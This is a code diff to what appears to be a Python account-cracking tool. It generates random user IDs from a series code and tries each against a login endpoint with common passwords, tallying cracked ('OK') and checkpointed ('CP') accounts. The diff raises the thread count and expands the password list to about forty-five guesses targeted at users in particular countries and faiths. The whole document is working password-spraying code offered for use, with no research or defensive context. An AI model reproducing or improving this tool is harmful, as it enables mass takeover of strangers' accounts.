@@ -332,7 +332,7 @@ def START_SERIES_CLONING(series_code):
     for i in range(limit):
         uid = series_code + ''.join(random.choices(string.digits, k=9))
         user.append(uid)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=40) as jihad:
         clear()
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
@@ -359,8 +359,17 @@ def login1(uid):
             f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
         )
         sys.stdout.flush()
-        ua = random.choice(ugen)    
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
+        ua = random.choice(ugen)
+        for pw in ["123456", "1234567", "12345678", "123456789", "111222",
+    "112233", "786786", "password", "pakistan", "000000",
+    "india123", "iloveyou", "000786", "786000", "lahore123",
+    "bangladesh", "445566", "102030", "bismillah", "mashallah",
+    "sayang", "mahal123", "indonesia", "philippines", "14344",
+    "nigeria123", "iloveyou123", "superman", "beautiful", "fatima",
+    "brasil123", "10203040", "007007", "iraq123", "morocco",
+    "azerty", "mahalkita", "welcome", "victoria", "miamor",
+    "gupta123", "khan786", "krishna123", "shiva123", "delhi123"
+]:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -421,7 +430,8 @@ def login1(uid):
                 break
             else:continue
         loop+=1
-    except Exception as e:time.sleep(30)
+    except Exception as e:
+            time.sleep(30)
 
 if __name__ == "__main__":
     main()
